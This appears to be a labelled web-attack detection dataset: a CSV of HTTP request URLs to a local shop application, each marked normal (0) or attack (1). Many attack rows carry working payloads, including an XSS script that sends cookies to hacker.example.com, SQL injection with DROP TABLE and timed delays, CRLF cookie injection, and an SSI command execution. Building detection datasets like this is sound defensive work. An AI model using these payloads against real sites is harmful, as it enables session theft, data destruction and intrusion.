URL,Target
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas ,1
http://localhost:8080/tienda1/global/creditos.jsp ,0
http://localhost:8080/tienda1/imagenes/1.gif ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=53&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp.INC ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/global/menum.jsp/6909030637832563290.jsp ,1
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9366&B1=Pasar+por+caja ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/global/creditos.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 ,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carritosessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tawauna45&password=dinosaurio&nombre=Delfo&apellidos=Modino+Esteban&email=ohalloran%40buscadordevideos.bw&dni=72732622K&direccion=Martin+De+Bocanogra+59%2C+3F&ciudad=Torell%F3&cp=13108&provincia=Segovia&ntc=9797216648384975&B1A=Registrar ,1
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Confirmar ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&precio=5059&B1=Confirmar ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/patient/register.do ,1
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/_cti_pvt/bots.cnf ,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=rodschat&password=5mp1o0isad65&nombre=Tarcisio&apellidos=Merlach+Corminas&email=azar%40archivodeimagenes.eu&dni=63154198Q&direccion=Carlos+Balenchana+83%2C+&ciudad=Lech%F3n&cp=24882&provincia=Girona&ntc=928497527479202A&B1=Registrar ,1
http://localhost:8080/tienda1/4861362529278789730 ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/imagenes~ ,1
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/iisstart.htm ,1
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6741&B1=Confirmar ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1.Old ,1
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=*corn%27eliu&pwd=dESHILadIZ&remember=off&B1=Entrar ,1
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1.inc ,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E ,1
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/travelnet/home.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/ ,1
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=lombardo&password=enRiS6rAr&nombre=Santos&apellidos=Gaja&email=karelsen_cisar%40seramitex.nu&dni=46809362S&direccion=C%2Fjon+De+Las+Moscas%2C+72+&ciudad=Librilla&cp=19119&provincia=Guip%FAzcoa&ntc=1686991353142188&B1=Registrar ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=derosenr&password=abarracar&nombre=Trist%E1n&apellidos=Pol+Lazcano&email=braverman-watkin%40docerosas.pl&dni=28010640K&direccion=C%2F+Antoni+Rosello+i+Nadal+172+&ciudad=Blancafort&cp=50522&provincia=Burgos&ntc=7871877495462595bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&B1=Registrar ,1
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp?idA=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=74&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&precio=1700&B1=Pasar+por+caja ,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/miembros/asf-logo-wide.gif/ ,1
http://localhost:8080/tienda1/miembros/index.jsp/asf-logo-wide.java ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=cheng&pwd=cazc%2Calear&remember=off&B1=Entrar ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=6606&B1=Pasar+por+caja ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1%2F&nombre=Vino+Rioja&precio=85&cantidad=38&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=brosso&password=misT66L&nombre=Adolfina&apellidos=Olalla+Padoan&email=pedrucho_mikkelborg%40demasiado.com.co&dni=69829332K&direccion=Arnau+D%27oms%2C+2+&ciudad=Morella&cp=50546&provincia=Ca.ntabria&ntc=6446879002828554&B1=Registrar ,1
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/global/creditos.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/global/creditos.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100&cantidad=37&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%253F ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=latchfor&pwd=chirona&remember=off&B1=Entrar ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=stephan&password=alfeiza&nombre=Silde&apellidos=Bayarri+Bach&email=lilien%40aprendeaestudiar.lt&dni=68252027X&direccion=Carrer+Riu+Sena+S%2FN+13-C&ciudad=Pedroso&cp=05296&provincia=Alicante&ntc=1350447535832439&B1=Registrar ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=100&cantidad=84&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/.INC ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%2520 ,1
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp/ ,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=croiseti&pwd=c%3Fidiana&remember=off&B1=Entrar ,0
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ailina&password=tel9m%E9trica&nombre=Fernando&apellidos=Palliser+Ba%2C%2Flbuena&email=dugan%40onlinegratis.ls&dni=70144091W&direccion=Calle+Monte+Del+Taco+102+12%3FA&ciudad=San+Miguel+de+Bernuy&cp=08694&provincia=Almer%EDa&ntc=0887576262160780&B1=Registrar ,1
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=an-son&pwd=4up493a562i5&remember=on&B1=Entrar ,1
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/.OLD ,1
http://localhost:8080/asf-logo-wide.Inc ,1
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4633&B1=Pasar+por+caja%2F ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=haylock&password=zANgaRulL%D3N&nombre=Eleuterio&apellidos=Acevedo+Cantonati&email=kuzuoglu5%40nomao.iq&dni=43751597P&direccion=C%2F+Maria+Moliner+48+&ciudad=Ojos+Negros&cp=10160&provincia=Salamanca&ntc=0358024000873525bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&B1=Registrar ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/IISSamples/sdk/asp/applications/Application_JScript.asp ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/imagenes/1.gif ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=waite&password=Hist%D3RI985Ent0&nombre=Argeo&apellidos=Bellveh%ED+Badrenas&email=dax-branson%40indianabilljaen.kp&dni=96685723W&direccion=Pasaje+Navarra%2C+98%2C+&ciudad=Banyeres+del+Pened%E8s&cp=50269&provincia=Salamanca&ntc=4550615091902563&B1=Registrar ,0
http://localhost:8080/tienda1/global/titulo.jsp/asf-logo-wide ,1
http://localhost:8080/flash/java/javabean/FlashJavaBean.html ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/publico/miembros.jsp/4861362529278789730.old ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/miembros/index.jsp/.Bak ,1
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- ,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100%2F&cantidad=28&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6148&B1=Pasar+por+caja ,0
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/iisadmpwd/aexp4.htr ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/IISSamples/sdk/asp/docs/toolbar.asp ,1
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/publico/pagar.jsp/asf-logo-wide.gif.INC ,1
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/imagenes/1.gif ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/examplesWebApp/SessionServlet ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/global/creditos.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg/4861362529278789730.old ,1
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6867&B1=Confirmar%2F ,1
http://localhost:8080/tienda1/imagenes/1.gif ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=bobbie7&pwd=8r126ec2o&remember=on&B1=Entrar ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=waller&pwd=3997o9a02&remember=on&B1=Entrar ,0
http://localhost:8080/tienda1/miembros/salir.jsp/asf-logo-wide ,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kube9&pwd=38r20NvE1e9&remember=on&B1=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727 ,1
http://localhost:8080/tienda1/publico/anadir.jsp?idA=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=24&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=100&cantidad=29&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=concor%27di&pwd=acordonada&remember=on&B1=Entrar ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=%253F&login=natraj&pwd=desa1a0car&remember=on&B1=Entrar ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jamaly&password=retorta&nombre=Leonella&apellidos=Bonilla+Balac&email=ostyn.martan%40icodea.lu&dni=30599008S&direccion=Calle+Marino+Cervera%2C+173%2C+&ciudad=Paracuellos+de+Jarama&cp=09390&provincia=Teruel&ntc=4422802563710608&B1=Registrar ,0
http://localhost:8080/asf-logo-wide.gif/ ,1
http://localhost:8080.inc ,1
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/asf-logo-wide.java ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=7044&B1=Pasar+por+caja ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/asf-logo-wide.Old ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=seipue&pwd=b*uba&remember=off&B1=Entrar ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bejar&password=litiGaR%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&nombre=Enzo&apellidos=Capell+Latre&email=borgato%4019horas.ee&dni=96483882D&direccion=Esperanto%2C+182%2C+&ciudad=Sobremunt&cp=19278&provincia=Alicante&ntc=2319237634289833&B1=Registrar ,1
